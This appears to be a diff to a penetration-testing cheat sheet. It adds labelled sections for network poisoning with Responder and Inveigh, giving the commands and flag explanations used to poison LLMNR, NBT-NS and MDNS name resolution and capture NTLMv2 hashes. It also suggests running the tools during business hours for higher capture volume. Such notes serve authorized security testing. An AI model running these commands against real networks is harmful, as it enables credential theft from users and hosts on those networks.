@@ -26,20 +26,22 @@ Capture raw traffic on the interface to identify live hosts and network topology
 ---
 ## Network Poisoning
 
+**Responder:**
+
 ```
 sudo responder -I <interface>
 ```
 
 Poison LLMNR, NBT-NS, and MDNS queries on the interface to capture NTLMv2 hashes from hosts attempting name resolution. Run during business hours to maximize capture volume.
 
-```
+**Inveigh:**
+
+```powershell
 Import-Module .\Inveigh.ps1
-```
-```
- Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
 ```
 
-We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`.
+PowerShell equivalent of Responder for Windows-based attack hosts. `-NBNS Y` enables NBT-NS poisoning, `-ConsoleOutput Y` prints captures to the console, `-FileOutput Y` writes results to disk. Type `GET NTLMV2UNIQUE` in the interactive console to view deduplicated captured hashes.
 
 ---
 ## Host Discovery
